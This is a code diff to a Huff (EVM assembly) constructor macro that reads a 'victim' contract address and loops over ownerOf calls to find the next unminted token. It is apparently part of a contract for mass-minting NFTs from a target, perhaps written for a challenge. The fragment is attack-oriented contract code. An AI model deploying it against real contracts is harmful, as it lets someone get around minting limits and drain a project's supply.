@@ -1,9 +1,27 @@
 #define macro MINT150_CONSTRUCTOR() = takes(0) returns(0) {
+    // Starting iterator
+    0x01                                    // [0x01]
     // Get victim address from end of bytecode
-    0x20 dup1 codesize sub                  // [offset, size]
-    returndatasize codecopy                 // []
-    returndatasize mload                    // [victim]
+    0x20 dup1 codesize sub                  // [offset, size, 0x01]
+    returndatasize codecopy                 // [0x01]
+    returndatasize mload                    // [victim, 0x01]
 
     // mstore function selectors
-    0x1249c58b23b872dd6352211e 0x04 mstore  // [victim]
+    0x1249c58b23b872dd6352211e 0x04 mstore  // [victim, 0x01]
+    dup1 dup3                               // [0x01, victim, victim, 0x01]
+
+    // Loop over ownerOf checks until it fails, giving us starting token id
+    is_owned:
+        // mstore start
+        0x24 mstore                         // [victim, victim, start]
+
+        // ownerOf call
+        0x00 0x24 0x20                      // [0x20, 0x24, 0, victim, victim, start]
+        0x00 swap4                          // [victim, 0x20, 0x24, 0, 0, victim, start]
+        gas staticcall                      // [success, victim, start]
+
+        // Increment start
+        swap2 0x01 add                      // [start + 1, victim, success]
+        swap1 dup1 swap2 dup1 swap4         // [success, start + 1, victim, victim, start + 1]
+    is_owned jumpi                          // [start + 1, victim, victim, start + 1]
 }
